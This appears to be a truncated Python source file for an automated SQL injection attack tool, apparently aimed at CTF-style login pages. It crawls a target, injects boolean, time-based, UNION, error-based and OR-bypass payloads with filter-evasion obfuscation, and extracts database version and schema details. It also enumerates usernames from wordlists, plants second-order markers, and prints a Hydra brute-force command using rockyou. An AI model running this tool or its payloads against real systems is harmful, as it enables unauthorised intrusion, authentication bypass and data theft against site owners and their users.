#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Concise SQLi tester — low-FP, auto-calibrated, scope-aware, with header/cookie probes, crawler,
# username enumeration (optional), and optional second-order sink polling.
# Behavior: If --user-enum is enabled and usernames are found, ALL form probes run using those usernames.
# Default: use only the first found username (override with --use-users N).
#
# Minimal flags: -u URL (required), -R/-r risk(1..4), -c confirm(1..5)
# Useful: --rounds N, --crawl DEPTH, --variants V, --user-enum [--userlist PATH --user-max N --use-users N],
#         --second-order SECONDS [--second-paths /a,/b], --no-probe-headers, --no-probe-cookies,
#         --allow-or, --hydra-hint, --debug
#
import argparse
import asyncio
import aiohttp
import re
import random
import statistics
import time
import os
import sys
from functools import partial
from typing import List, Tuple, Dict, Any, Set, Optional, Callable
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, urlunparse

# -----------------------------
# Defaults & hard limits
# -----------------------------
DEF_RISK = 2
DEF_CONFIRM = 2
DEF_ROUNDS = 3

MIN_CONFIRM, MAX_CONFIRM = 1, 5
MIN_ROUNDS, MAX_ROUNDS = 1, 6

# Auto-tuned ranges
AUTO_MIN_THREADS, AUTO_MAX_THREADS = 6, 32  # normal lane
AUTO_MIN_TIMEOUT, AUTO_MAX_TIMEOUT = 6, 20  # seconds

# Time-based lane is slower & capped
TIME_MIN_THREADS, TIME_MAX_THREADS = 2, 12

# Timing thresholds (computed from calibration)
MIN_TIME_THRESH, MAX_TIME_THRESH = 3.5, 10.0

# Δlen thresholds
MIN_LEN_RATIO, DEF_LEN_RATIO = 0.12, 0.18
SMALL_BODY_LEN = 400
MIN_ABS_LEN_BUMP = 60  # promotes Δlen to primary if big enough

# Heuristic auth markers (tune per target if known)
FAIL_MARKERS = [
    "invalid username and password",
    "invalid login",
    "try again",
    "error",
    "failed",
]
FAIL_USER_ONLY_MARKERS = [
    "invalid username",
]
FAIL_PASS_ONLY_MARKERS = [
    "invalid password",
]
SUCCESS_MARKERS = [
    "welcome",
    "success",
    "logged in",
    "dashboard",
    "congratulations",
    "flag{",
    "flag:",
]

# DB error fragments (common across engines)
DB_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_",
    "sql syntax",
    "unclosed quotation",
    'near "',
    "syntax error",  # SQLite-ish
    "odbc sql server",
    "oledb",
    "microsoft sql server",
    "psql:",
    "postgresql",
    "pq: syntax",
    "sqlite error",
    "sqlite3",
    "unrecognized token",
    "ora-",
    "oracle error",
    "db2 sql error",
]

# Try some common GET params only if none are found
DEFAULT_GET_PARAMS = [
    "id",
    "page",
    "q",
    "s",
    "search",
    "user",
    "sort",
    "order",
    "category",
    "pid",
    "product",
    "item",
    "name",
    "ref",
    "type",
]

HEADER_NAMES = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]

# Default second-order polling paths (relative to site root)
DEFAULT_SECOND_PATHS = [
    "/",
    "/index",
    "/home",
    "/dashboard",
    "/profile",
    "/log",
    "/logs",
    "/report",
    "/reports",
]

# Username-like field candidates
USER_FIELD_CANDIDATES = {
    "username",
    "user",
    "usr",
    "login",
    "name",
    "email",
    "uname",
    "u",
}

# -----------------------------
# Global runtime counters / flags
# -----------------------------
_SHUTDOWN = False
REQ_SENT = 0
LIVE_HITS = 0
HITS_HEADER_PRINTED = False


# -----------------------------
# Console helpers (ticker-safe printing)
# -----------------------------
def _erase_line():
    # ANSI erase-current-line, return to start
    sys.stdout.write("\r\033[2K")
    sys.stdout.flush()


def _println(s: str = ""):
    _erase_line()
    sys.stdout.write(s + "\n")
    sys.stdout.flush()


# -----------------------------
# Small helpers
# -----------------------------
def has_any(tx: str, needles: List[str]) -> bool:
    if not tx:
        return False
    t = (tx or "").lower()
    return any(n in t for n in needles)


def has_fail_marker(tx: str) -> bool:
    return has_any(tx, FAIL_MARKERS)


def has_fail_user_only(tx: str) -> bool:
    return has_any(tx, FAIL_USER_ONLY_MARKERS)


def has_fail_pass_only(tx: str) -> bool:
    return has_any(tx, FAIL_PASS_ONLY_MARKERS)


def has_success_marker(tx: str) -> bool:
    return has_any(tx, SUCCESS_MARKERS)


def has_db_error(tx: str) -> bool:
    return has_any(tx, DB_ERRORS)


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def token_case_shuffle(token: str) -> str:
    return "".join(ch.upper() if random.random() < 0.5 else ch.lower() for ch in token)


def split_with_comments(tokenized: List[str]) -> str:
    out = []
    for i, t in enumerate(tokenized):
        out.append(t)
        if i < len(tokenized) - 1 and random.random() < 0.6:
            out.append("/**/")
    return "".join(out)


def maybe_urlencode_spaces_and_quotes(s: str) -> str:
    if random.random() < 0.5:
        s = s.replace(" ", "%20")
    if random.random() < 0.35:
        s = s.replace("'", "%27").replace('"', "%22")
    return s


def with_comment_suffix(s: str) -> str:
    suffix = random.choice(
        ["-- ", "-- -", "# "]
    )  # ensure space after comment introducer
    if s.endswith(("--", "--+", "#")):
        return s + " "
    if s.endswith(("-- ", "-- -", "# ")):
        return s
    if s.endswith(" "):
        return s + suffix
    return s + " " + suffix


def obfuscate_payload(base: str) -> str:
    toks = re.split(r"(\s+|,|\(|\)|=|;)", base)

    def maybe_shuffle(tok):
        st = tok.strip()
        if st.startswith("'") or st.startswith('"'):
            return tok
        if tok in (" ", ",", "(", ")", "=", ";"):
            return tok
        return token_case_shuffle(tok)

    toks = [maybe_shuffle(t) for t in toks]
    s = split_with_comments(toks)
    s = maybe_urlencode_spaces_and_quotes(s)
    if not re.search(r"(--\s|#\s)$", s):
        s = with_comment_suffix(s)
    return s


def make_benign_value(field_name: str) -> str:
    ln = field_name.lower()
    if "mail" in ln:
        return "a@a.test"
    return "a"


def build_url_with_params(url: str, params: Dict[str, str]) -> str:
    u = urlparse(url)
    existing = dict(parse_qsl(u.query, keep_blank_values=True))
    existing.update(params)
    new_q = urlencode(existing, doseq=True)
    return urlunparse((u.scheme, u.netloc, u.path, u.params, new_q, u.fragment))


def normalize_url(u: str) -> str:
    p = urlparse(u)
    path = p.path or "/"
    path = re.sub(r"/{2,}", "/", path)
    return urlunparse((p.scheme, p.netloc, path, p.params, p.query, p.fragment))


def file_exists(p: str) -> bool:
    try:
        return os.path.isfile(p)
    except Exception:
        return False


# -----------------------------
# HTML form parsing
# -----------------------------
def parse_forms(html: str, base_url: str):
    forms = []
    try:
        from bs4 import BeautifulSoup

        soup = BeautifulSoup(html or "", "html-parser" if False else "html.parser")
        for f in soup.find_all("form"):
            method = (f.get("method") or "GET").upper()
            action = urljoin(base_url, f.get("action") or base_url)
            action = normalize_url(action)
            fields = []
            for inp in f.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                typ = (inp.get("type") or "text").lower()
                fields.append((name, typ))
            if fields:
                forms.append({"method": method, "action": action, "fields": fields})
    except Exception:
        pass
    # regex fallback (single form)
    if not forms:
        m = re.search(
            r'<form[^>]*?(?:action="([^"]*)")?[^>]*?(?:method="([^"]*)")?[^>]*>(.*?)</form>',
            html or "",
            re.I | re.S,
        )
        if m:
            action = urljoin(base_url, m.group(1) or base_url)
            action = normalize_url(action)
            method = (m.group(2) or "GET").upper()
            body = m.group(3) or ""
            fields = []
            for z in re.finditer(
                r'<input[^>]*name="([^"]+)"[^>]*?(?:type="([^"]*)")?[^>]*>', body, re.I
            ):
                fields.append((z.group(1), (z.group(2) or "text").lower()))
            if fields:
                forms.append({"method": method, "action": action, "fields": fields})
    return forms


def extract_get_candidates(html: str, base_url: str, cap: int = 20):
    found = set()
    for m in re.finditer(r'href="([^"]+)"', html or "", re.I):
        href = normalize_url(urljoin(base_url, m.group(1)))
        q = urlparse(href).query
        if not q:
            continue
        for k, _ in parse_qsl(q, keep_blank_values=True):
            found.add((href, k))
    uniq_by_param = {}
    for url, k in found:
        if k not in uniq_by_param:
            uniq_by_param[k] = (url, k)
        if len(uniq_by_param) >= cap:
            break
    return list(uniq_by_param.values())


# -----------------------------
# HTTP + calibration
# -----------------------------
async def fetch(
    session, method, url, *, data=None, timeout=12, headers=None, cookies=None
):
    global REQ_SENT
    REQ_SENT += 1
    t0 = time.perf_counter()
    try:
        async with session.request(
            method, url, data=data, timeout=timeout, headers=headers, cookies=cookies
        ) as resp:
            text = await resp.text(errors="replace")
            dt = time.perf_counter() - t0
            return resp.status, text, dt, resp.cookies, None
    except Exception as e:
        return -1, "", time.perf_counter() - t0, {}, str(e)


async def calibrate(session, base_url, debug=False):
    samples = []
    for _ in range(14):
        st, tx, dt, _, _ = await fetch(session, "GET", base_url, timeout=12)
        if st >= 0:
            samples.append((len(tx or ""), dt))
        await asyncio.sleep(0.03)
    if not samples:
        return dict(
            time_thresh=MIN_TIME_THRESH,
            len_ratio=DEF_LEN_RATIO,
            threads=AUTO_MIN_THREADS,
            time_threads=TIME_MIN_THREADS,
            timeout=12,
            time_timeout=12,
        )
    sizes = [s for s, _ in samples]
    times = [t for _, t in samples]
    p95 = sorted(times)[max(0, int(0.95 * len(times)) - 1)]
    mean = statistics.mean(times)
    stdev = statistics.pstdev(times) if len(times) > 1 else 0.0

    time_thresh = max(p95 + 1.0, mean + 3 * stdev, MIN_TIME_THRESH)
    time_thresh = min(time_thresh, MAX_TIME_THRESH)

    med_sz = sorted(sizes)[len(sizes) // 2]
    len_ratio = DEF_LEN_RATIO if med_sz >= SMALL_BODY_LEN else max(MIN_LEN_RATIO, 0.20)

    base_to = clamp(p95 * 4, AUTO_MIN_TIMEOUT, AUTO_MAX_TIMEOUT)
    time_to = clamp(p95 * 6, AUTO_MIN_TIMEOUT, AUTO_MAX_TIMEOUT)
    time_to = max(time_to, MIN_TIME_THRESH + 2.0)

    if p95 <= 0.10:
        tnorm = 28
    elif p95 <= 0.20:
        tnorm = 24
    elif p95 <= 0.40:
        tnorm = 18
    elif p95 <= 0.80:
        tnorm = 12
    else:
        tnorm = 8
    threads = clamp(tnorm, AUTO_MIN_THREADS, AUTO_MAX_THREADS)
    time_threads = clamp(
        max(threads // 2, TIME_MIN_THREADS), TIME_MIN_THREADS, TIME_MAX_THREADS
    )

    if debug:
        print(
            f"[dbg] p95={p95:.3f}s mean={mean:.3f}s stdev={stdev:.3f}s -> thr={threads}/{time_threads} to={base_to:.1f}/{time_to:.1f} thres={time_thresh:.2f}"
        )

    return dict(
        time_thresh=time_thresh,
        len_ratio=len_ratio,
        threads=threads,
        time_threads=time_threads,
        timeout=base_to,
        time_timeout=time_to,
    )


# -----------------------------
# Lightweight crawler (same-origin)
# -----------------------------
def same_origin(a: str, b: str) -> bool:
    ua, ub = urlparse(a), urlparse(b)
    return (ua.scheme, ua.netloc) == (ub.scheme, ub.netloc)


async def crawl(
    session,
    start_url: str,
    depth: int,
    per_page_cap: int = 20,
    overall_cap: int = 40,
    debug=False,
):
    if depth <= 0:
        return [normalize_url(start_url)]
    start_url = normalize_url(start_url)
    seen: Set[str] = set([start_url])
    q = [(start_url, 0)]
    out = [start_url]
    while q and len(out) < overall_cap:
        url, d = q.pop(0)
        if d >= depth:
            continue
        st, tx, dt, _, _ = await fetch(session, "GET", url, timeout=12)
        if st < 0 or not tx:
            continue
        links = set()
        for m in re.finditer(r'href="([^"]+)"', tx or "", re.I):
            href = normalize_url(urljoin(url, m.group(1)))
            if not same_origin(start_url, href):
                continue
            if len(links) >= per_page_cap:
                break
            links.add(href)
        for href in links:
            if href not in seen:
                seen.add(href)
                out.append(href)
                q.append((href, d + 1))
            if len(out) >= overall_cap:
                break
    if debug:
        print(f"[*] Crawl(depth={depth}) -> {len(out)} page(s)")
    return out


# -----------------------------
# Payloads by risk (no OR unless --allow-or)
# -----------------------------
def build_payloads(risk: int, allow_or: bool):
    # Basic probes
    basic = ["'", '"', "1'", "admin' -- -", "' -- -", '" -- -']

    # Boolean (safe)
    boolean_safe = ["' AND 1=2-- -"]

    # Boolean (true/false) WITHOUT OR by default
    boolean_pair = [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND '1'='1'-- -",
        "' AND '1'='2'-- -",
    ]

    # Time-based (generic per DB)
    time_all = [
        "' AND SLEEP(5)-- -",  # MySQL
        "' AND pg_sleep(5)-- -",  # PostgreSQL
        "WAITFOR DELAY '0:0:5'-- ",  # MSSQL
        "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual)-- -",  # Oracle
    ]

    # UNION / ORDER BY (read-only)
    union = [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' ORDER BY 3-- -",
    ]

    # Error-based (read-only)
    error_based = ["' AND updatexml(null, concat(0x7e, version()), null)-- -"]

    # OR-bypass (only if explicitly allowed)
    or_bypass = ["' OR 1=1-- -", "admin'-- -", "admin' OR 1=1-- -"] if allow_or else []

    # DB info examples (read-only unions)
    db_info = [
        "' UNION SELECT 1, user(), database(), @@version-- -",  # MySQL-ish
        "' UNION SELECT current_database(), current_user, version()-- -",  # PostgreSQL
        "' UNION SELECT name, sql FROM sqlite_master-- -",  # SQLite
        "' UNION SELECT @@version, SYSTEM_USER, DB_NAME()-- -",  # MSSQL
        "' UNION SELECT banner, user FROM v$version-- -",  # Oracle
    ]

    normal = []
    time = []
    normal.extend(basic)

    if risk == 1:
        normal.extend(boolean_safe)
    elif risk == 2:
        normal.extend(boolean_pair + error_based + db_info + or_bypass)
    elif risk == 3:
        normal.extend(boolean_pair + error_based + db_info + union + or_bypass)
    else:  # risk == 4
        normal.extend(boolean_pair + error_based + db_info + union + or_bypass)

    time.extend(time_all)
    return {"normal": normal, "time": time}


# -----------------------------
# Evaluation
# -----------------------------
def make_eval(
    st0: int,
    tx0: str,
    L0: int,
    base_fail_local: bool,
    base_succ_local: bool,
    TIME_THRESHOLD: float,
    LEN_RATIO: float,
):
    def _eval(st: int, tx: str, dt: float, *, time_sensitive: bool = False):
        primary = []
        support = []
        if st != st0:
            primary.append(f"status {st0}->{st}")
        if has_db_error(tx):
            primary.append("db-error")
        bypass = False
        if base_fail_local and not has_fail_marker(tx):
            bypass = True
        if has_success_marker(tx) and not base_succ_local:
            bypass = True
        if bypass:
            primary.append("auth-marker-flip")
        L = len(tx or "")
        if L0 > 0:
            rel = abs(L - L0) / max(L0, 1)
            if rel >= LEN_RATIO:
                # promote big Δlen to primary for visibility
                if abs(L - L0) >= max(MIN_ABS_LEN_BUMP, int(0.06 * max(L0, 1))):
                    primary.append(f"Δlen {L0}->{L}")
                else:
                    support.append(f"Δlen {L0}->{L}")
        if time_sensitive and dt >= TIME_THRESHOLD:
            primary.append(f"delay {dt:.2f}s")
        return bool(primary), ", ".join(primary + support), bypass, L

    return _eval


class Hit:
    __slots__ = (
        "lane",
        "where",
        "field",
        "sink",
        "base_payload",
        "variant_payload",
        "time_sensitive",
        "evidence",
        "dt",
        "L",
        "confirm_ok",
        "enum_user",
        "user_field_name",
    )

    def __init__(self, **kw):
        for k, v in kw.items():
            setattr(self, k, v)
        self.confirm_ok = False


async def run_pool(session, task_factories: List[Callable[[], Any]], concurrency: int):
    sem = asyncio.Semaphore(concurrency)
    results = []
    err_count = 0

    async def _wrap(factory: Callable[[], Any]):
        nonlocal err_count
        try:
            async with sem:
                coro = factory()
                return await coro
        except asyncio.CancelledError:
            return None
        except Exception:
            err_count += 1
            return None

    rets = await asyncio.gather(
        *[_wrap(f) for f in task_factories], return_exceptions=True
    )
    for r in rets:
        if isinstance(r, Exception) or r is None:
            continue
        results.append(r)
    return results, err_count


# -----------------------------
# Username enumeration (optional)
# -----------------------------
COMMON_USERLISTS = [
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "/usr/share/seclists/Usernames/common-usernames.txt",
    "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
    "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
    "/usr/share/wordlists/seclists/Usernames/common-usernames.txt",
    "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
]


def pick_userlist(explicit_path: Optional[str]) -> Optional[str]:
    if explicit_path and file_exists(explicit_path):
        return explicit_path
    for p in COMMON_USERLISTS:
        if file_exists(p):
            return p
    return None


def choose_login_fields(
    fields: List[Tuple[str, str]],
) -> Tuple[Optional[str], Optional[str]]:
    uname = None
    for n, t in fields:
        ln = n.lower()
        if any(
            k in ln
            for k in ["username", "user", "login", "name", "email", "uname", "u"]
        ):
            uname = n
            break
    if not uname and fields:
        uname = fields[0][0]
    pw = None
    for n, t in fields:
        if t.lower() == "password" or n.lower() == "password":
            pw = n
            break
    if not pw and len(fields) >= 2:
        pw = fields[1][0]
    return uname, pw


async def post_login(
    session, form, username_key, password_key, username_val, password_val, timeout
):
    data = {name: make_benign_value(name) for name, _ in form["fields"]}
    if username_key:
        data[username_key] = username_val
    if password_key:
        data[password_key] = password_val
    st, tx, dt, _ck, err = await fetch(
        session, form["method"], form["action"], data=data, timeout=timeout
    )
    return st, tx, dt, err


async def enumerate_usernames(
    session, form, timeout, userlist_path: str, user_cap: int
):
    username_key, password_key = choose_login_fields(form["fields"])
    if not username_key or not password_key:
        _println(
            "[*] Enum: could not identify username/password fields reliably; skipping."
        )
        return []
    _st_b, tx_b, _dt_b, _err = await post_login(
        session, form, username_key, password_key, "zzz_no_user_x", "a", timeout
    )
    L_b = len(tx_b or "")
    L_shapes = set([L_b])
    for probe in ["admin", "test", "user"]:
        _st_p, tx_p, _dt_p, _err = await post_login(
            session, form, username_key, password_key, probe, "wrong", timeout
        )
        L_shapes.add(len(tx_p or ""))
    hits = []
    tried = 0
    try:
        with open(userlist_path, "r", errors="ignore") as f:
            for line in f:
                if tried >= user_cap:
                    break
                cand = line.strip()
                if not cand or len(cand) > 64:
                    continue
                tried += 1
                _st, tx, _dt, _err = await post_login(
                    session, form, username_key, password_key, cand, "a", timeout
                )
                L = len(tx or "")
                fail = has_fail_marker(tx)
                pass_only = has_fail_pass_only(tx)
                succ = has_success_marker(tx)
                shape_diff = (abs(L - L_b) >= max(40, int(0.05 * max(L_b, 1)))) and (
                    L not in L_shapes
                )
                if pass_only or (not fail and not succ and shape_diff):
                    hits.append(cand)
                    if len(hits) >= 10:
                        break
    except FileNotFoundError:
        _println(f"[*] Enum: userlist not found: {userlist_path}")
        return []
    if hits:
        _println(
            f"[*] Enum: candidate user(s) suggesting existence -> {', '.join(hits[:8])}{' ...' if len(hits)>8 else ''}"
        )
    else:
        _println("[*] Enum: no user candidates detected (within cap).")
    return hits


# -----------------------------
# Second-order sink planting & polling (optional)
# -----------------------------
def build_second_paths(base_url: str, user_paths_csv: Optional[str]) -> List[str]:
    base = urlparse(base_url)
    paths = DEFAULT_SECOND_PATHS.copy()
    if user_paths_csv:
        for p in user_paths_csv.split(","):
            p = p.strip()
            if not p:
                continue
            if not p.startswith("/"):
                p = "/" + p
            if p not in paths:
                paths.append(p)
    out = []
    for p in paths:
        out.append(urlunparse((base.scheme, base.netloc, p, "", "", "")))
    return out


async def second_order_plant_and_poll(
    session,
    url: str,
    forms: List[Tuple[str, dict]],
    seconds: int,
    paths_csv: Optional[str],
    timeout: int,
):
    if seconds <= 0 or not forms:
        return False
    login_form = None
    for pg, f in forms:
        if pg == url:
            login_form = f
            break
    if not login_form:
        for pg, f in forms:
            if any(t == "password" or n.lower() == "password" for n, t in f["fields"]):
                login_form = f
                break
    if not login_form:
        _println("[*] 2nd: no obvious form to plant marker; skipping.")
        return False

    uname, pkey = choose_login_fields(login_form["fields"])
    if not uname:
        _println("[*] 2nd: no username-like field; skipping.")
        return False

    marker = f"mk_{int(time.time())}_{random.randint(1000,9999)}"
    payload = f"{marker}'--%0A"
    data = {name: make_benign_value(name) for name, _ in login_form["fields"]}
    data[uname] = payload
    if pkey:
        data[pkey] = "a"
    _st, _tx, _dt, _ck, _err = await fetch(
        session, login_form["method"], login_form["action"], data=data, timeout=timeout
    )
    _println(
        f"[*] 2nd: planted marker '{marker}' via {login_form['method']} {login_form['action']} field '{uname}'."
    )

    targets = build_second_paths(url, paths_csv)
    _println(f"[*] 2nd: polling {len(targets)} path(s) for {seconds}s...")
    t0 = time.time()
    while time.time() - t0 < seconds and not _SHUTDOWN:
        for tgt in targets:
            st, tx, dt, _ck, _err = await fetch(session, "GET", tgt, timeout=timeout)
            if st >= 0 and tx and marker in tx:
                _println(f"[+] 2nd: marker appeared at {tgt}")
                return True
        await asyncio.sleep(1.0)
    _println("[*] 2nd: no marker observed in the polling window.")
    return False


# -----------------------------
# Status ticker (single-line, starts right after setup summary)
# -----------------------------
async def status_ticker(start_time: float):
    while not _SHUTDOWN:
        elapsed = time.perf_counter() - start_time
        sys.stdout.write(
            f"\r\033[2K[~] elapsed {elapsed:.1f}s | total requests sent {REQ_SENT} | live hits {LIVE_HITS}"
        )
        sys.stdout.flush()
        await asyncio.sleep(0.5)
    _erase_line()


# -----------------------------
# Main scan orchestration
# -----------------------------
async def main():
    global _SHUTDOWN, HITS_HEADER_PRINTED, LIVE_HITS

    ap = argparse.ArgumentParser(
        description="Concise SQLi tester with auto-calibration, crawler, header/cookie probes, username enumeration, and second-order polling"
    )
    ap.add_argument(
        "-u", "--url", required=True, dest="url", help="Target URL (e.g. http://host/)"
    )
    ap.add_argument(
        "-R",
        "--risk",
        "-r",
        dest="risk",
        type=int,
        choices=[1, 2, 3, 4],
        default=DEF_RISK,
        help="Risk level 1..4 (default 2)",
    )
    ap.add_argument(
        "-c",
        "--confirm",
        type=int,
        default=DEF_CONFIRM,
        help="Confirm replays (default 2)",
    )
    ap.add_argument(
        "--rounds",
        type=int,
        default=DEF_ROUNDS,
        help="How many rounds to repeat probes (default 3, max 6)",
    )
    ap.add_argument(
        "--variants",
        type=int,
        default=None,
        help="Tamper variants per base payload per round (default: 1, or 2 if risk>=3)",
    )
    ap.add_argument(
        "--crawl",
        type=int,
        default=-1,
        help="Crawl depth (default: auto; risk>=2 -> 2 else 0)",
    )
    ap.add_argument(
        "--max-cands",
        type=int,
        default=15,
        help="Max GET candidates across pages (default 15)",
    )
    ap.add_argument(
        "--no-probe-headers", action="store_true", help="Disable header probing"
    )
    ap.add_argument(
        "--no-probe-cookies", action="store_true", help="Disable cookie probing"
    )
    ap.add_argument(
        "--force-threads",
        type=int,
        default=None,
        help="Override auto threads for normal lane",
    )
    ap.add_argument(
        "--force-timeout",
        type=int,
        default=None,
        help="Override auto timeout seconds (normal lane)",
    )
    ap.add_argument(
        "--allow-or",
        action="store_true",
        help="Include OR/logic-bypass payloads (DANGEROUS on some targets)",
    )
    ap.add_argument(
        "--user-enum",
        action="store_true",
        help="Enable username enumeration before probing",
    )
    ap.add_argument(
        "--userlist",
        type=str,
        default=None,
        help="Path to username wordlist (default: auto-pick common SecLists)",
    )
    ap.add_argument(
        "--user-max",
        type=int,
        default=500,
        help="Max usernames to test during enumeration (default 500)",
    )
    ap.add_argument(
        "--use-users",
        type=int,
        default=1,
        help="How many found usernames to use across probes (default 1)",
    )
    ap.add_argument(
        "--second-order",
        type=int,
        default=0,
        help="Seconds to poll for second-order sinks after planting a marker (default 0=off)",
    )
    ap.add_argument(
        "--second-paths",
        type=str,
        default=None,
        help="Comma-separated paths to poll in second-order mode (e.g., /,/logs,/report)",
    )
    ap.add_argument(
        "--hydra-hint",
        action="store_true",
        help="Print a Hydra command template for the detected login form",
    )
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()

    url = normalize_url(args.url)
    risk = args.risk
    confirm = clamp(args.confirm, MIN_CONFIRM, MAX_CONFIRM)
    rounds = clamp(args.rounds, MIN_ROUNDS, MAX_ROUNDS)
    variants = (
        args.variants
        if (args.variants and args.variants > 0)
        else (2 if risk >= 3 else 1)
    )
    allow_or = bool(args.allow_or)
    use_users = max(1, int(args.use_users))

    crawl_depth = args.crawl if args.crawl >= 0 else (2 if risk >= 2 else 0)
    probe_headers = (risk >= 2) and (not args.no_probe_headers)
    probe_cookies = (risk >= 2) and (not args.no_probe_cookies)

    jar = aiohttp.CookieJar(unsafe=True)
    scan_start = time.perf_counter()

    try:
        async with aiohttp.ClientSession(
            cookie_jar=jar, connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            # Calibration
            cal = await calibrate(session, url, debug=args.debug)
            TIME_THRESHOLD = cal["time_thresh"]
            LEN_RATIO = cal["len_ratio"]
            threads = args.force_threads if args.force_threads else cal["threads"]
            time_threads = max(TIME_MIN_THREADS, min(TIME_MAX_THREADS, threads // 2))
            timeout = args.force_timeout if args.force_timeout else int(cal["timeout"])
            time_timeout = int(cal["time_timeout"])
            if args.force_timeout:
                time_timeout = max(time_timeout, timeout)

            print(
                f"[*] Settings -> url={url} risk={risk} confirm={confirm} rounds={rounds}"
            )
            print(f"[*] Threads (normal/time): {threads}/{time_threads}")
            print(f"[*] Timeouts (normal/time): {timeout}s/{time_timeout}s")
            print(
                f"[*] Thresholds -> time>{TIME_THRESHOLD:.2f}s  Δlen>={int(LEN_RATIO*100)}%  (auto)"
            )
            if risk == 1:
                rnote = "R1=basic+FALSE-boolean"
            elif risk == 2:
                rnote = "R2=R1+boolean-pair+error+db-info"
            elif risk == 3:
                rnote = "R3=R2+UNION/ORDER-BY"
            else:
                rnote = "R4=R3+OR-bypass"
            print(
                f"[*] Risk profile -> {rnote}; tamper variants per base: {variants} {'(+OR)' if allow_or else '(no OR)'}"
            )

            # Crawl
            pages = await crawl(session, url, crawl_depth, debug=args.debug)

            # Discover forms & GET candidates
            forms = []
            get_cands = []
            for pg in pages:
                st, tx, dt, cookies, err = await fetch(
                    session, "GET", pg, timeout=timeout
                )
                if st < 0:
                    continue
                fs = parse_forms(tx, pg)
                for f in fs:
                    forms.append((pg, f))
                cands = extract_get_candidates(tx, pg, cap=20)
                get_cands.extend(cands)

            # De-duplicate forms
            form_keys = set()
            uniq_forms = []
            for pg, f in forms:
                key = (
                    f["method"],
                    f["action"],
                    tuple(sorted(n for n, _ in f["fields"])),
                )
                if key in form_keys:
                    continue
                form_keys.add(key)
                uniq_forms.append((pg, f))
            forms = uniq_forms

            # De-duplicate GET candidates
            seen_gp = set()
            uniq = []
            for u, p in get_cands:
                key = (u.split("?")[0], p)
                if key in seen_gp:
                    continue
                seen_gp.add(key)
                uniq.append((u, p))
                if len(uniq) >= args.max_cands:
                    break
            get_cands = uniq

            if not get_cands:
                get_cands = [(url, k) for k in DEFAULT_GET_PARAMS[: args.max_cands]]

            # Summaries
            if forms:
                print(f"[*] Forms: {len(forms)}")
                for i, (pg, f) in enumerate(forms, 1):
                    fields = ", ".join(n for n, _ in f["fields"])
                    print(
                        f"  - [{i}/{len(forms)}] {f['method']} {f['action']} ({fields})"
                    )
            else:
                print("[*] Forms: 0")
            print(f"[*] GET params: {len(get_cands)} candidates (url,param)")
            if probe_headers or probe_cookies:
                who = []
                if probe_headers:
                    who.append("headers")
                if probe_cookies:
                    who.append("cookies")
                print(f"[*] Also probing: {', '.join(who)}")

            # ---- Start ticker right after setup summary ----
            ticker_task = asyncio.create_task(status_ticker(scan_start))

            # Hydra hint (if requested)
            if args.hydra_hint and forms:
                form0 = forms[0][1]
                host = urlparse(url).netloc
                path = urlparse(form0["action"]).path or "/"
                uname, pword = choose_login_fields(form0["fields"])
                if not uname:
                    uname = form0["fields"][0][0]
                if not pword:
                    pword = next(
                        (n for n, _ in form0["fields"] if "pass" in n.lower()),
                        "password",
                    )

                def pick_default_users():
                    for p in [
                        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                        "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
                    ]:
                        if file_exists(p):
                            return p
                    return "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

                hydra_users = pick_default_users()
                hydra_pass = (
                    "/usr/share/wordlists/rockyou.txt"
                    if file_exists("/usr/share/wordlists/rockyou.txt")
                    else "/path/to/rockyou.txt"
                )
                stx, txx, _, _, _ = await fetch(session, "GET", url, timeout=timeout)
                fail_marker = "Invalid username and password."
                m = re.search(r"(invalid[^<\n]{0,60})", txx or "", re.I)
                if m:
                    fail_marker = m.group(1)
                fm = fail_marker.replace('"', r"\"")
                _println("\n[*] Hydra hint:")
                _println(
                    f"hydra -L {hydra_users} -P {hydra_pass} {host} "
                    f'http-post-form "{path}:{uname}=^USER^&{pword}=^PASS^:{fm}" --timeout {timeout}\n'
                )

            # Username enumeration (BEFORE building baselines / scheduling probes)
            enum_users: List[str] = []
            if args.user_enum and forms:
                # choose a likely login form
                login_form = None
                for pg, f in forms:
                    if pg == url:
                        login_form = f
                        break
                if not login_form:
                    for pg, f in forms:
                        if any(
                            t == "password" or n.lower() == "password"
                            for n, t in f["fields"]
                        ):
                            login_form = f
                            break
                if login_form:
                    upl = pick_userlist(args.userlist)
                    if upl:
                        _println(
                            f"[*] Enum: using wordlist {upl} (max {args.user_max})"
                        )
                        enum_hits = await enumerate_usernames(
                            session, login_form, timeout, upl, args.user_max
                        )
                        if enum_hits:
                            enum_users = enum_hits[:use_users]
                            _println(
                                f"[*] Will use {len(enum_users)} username(s) across all form probes: {', '.join(enum_users)}"
                            )
                        else:
                            _println(
                                "[*] No usernames found; scanning without user context."
                            )
                    else:
                        _println(
                            "[*] Enum: no suitable wordlist found (try --userlist PATH)."
                        )
                else:
                    _println("[*] Enum: no obvious login form; skipping enumeration.")

            # Optional: Second-order planting & polling
            if args.second_order and forms:
                _ = await second_order_plant_and_poll(
                    session, url, forms, args.second_order, args.second_paths, timeout
                )

            # Build baselines
            baselines = (
                []
            )  # tuples: (lane, where, field, baseline, benign_data/url, eval_fn, user_field_name)

            def detect_user_field(fields: List[Tuple[str, str]]) -> Optional[str]:
                for n, _ in fields:
                    if n.lower() in USER_FIELD_CANDIDATES:
                        return n
                return None

            async def baseline_for_form(f):
                data = {name: make_benign_value(name) for name, _ in f["fields"]}
                st, tx, dt, ck, err = await fetch(
